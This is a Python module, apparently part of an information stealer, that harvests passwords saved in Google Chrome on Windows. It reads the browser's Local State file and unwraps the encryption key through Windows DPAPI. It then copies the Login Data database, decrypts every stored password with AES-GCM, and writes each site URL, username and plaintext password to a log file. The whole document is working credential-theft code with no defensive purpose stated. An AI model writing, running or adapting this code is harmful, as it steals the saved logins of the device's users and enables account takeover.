import base64
import json
import os
import shutil
import sqlite3
import win32crypt
import Cryptodome.Cipher.AES

class ChromePass:
    """
    Collects saved chrome passwords from device
    """

    def __init__(self, chromepass_filename: str) -> None:
        """
        Constructor

        :param chromepass_filename: The name of the file to save the log to
        """
        self.chromepass_filename = chromepass_filename

    def get_key(self) -> str:
        """
        Gets the key to decrypt the chrome data
        """

        local_state_file = r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])
        local_state = json.loads(open(local_state_file).read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:] 
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key

    def decrypt(self, raw_encrypted, key: str) -> str:
        """
        Decrypts the data from chrome

        :param key: ???
        """

        #(3-a) Initialisation vector for AES decryption
        AES_vector = raw_encrypted[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted = raw_encrypted[15:-16]
        cipher =  Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_GCM, AES_vector)
        decrypted = cipher.decrypt(encrypted)
        decrypted = decrypted.decode()  
        return decrypted

    def get_chrome_pass(self) -> None:
        """
        Function to get the passwords stored in google chrome
        """

        login_data = ""
        path = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE'])
        key = self.get_key()
        shutil.copy2(path, "logindata.db") 
        conn = sqlite3.connect("logindata.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for tuple in cursor.fetchall():
            if (tuple[0] != "" and tuple[1] != "" and tuple[2] != ""):
                login_data += tuple[0] + "," + tuple[1] + "," + self.decrypt(tuple[2], key) + "|||"
        # print(login_data)
        cursor.close()
        conn.close()
        os.remove("logindata.db")

        # Write passwords to a file
        f = open(self.chromepass_filename, "w")
        f.write(login_data)
        f.close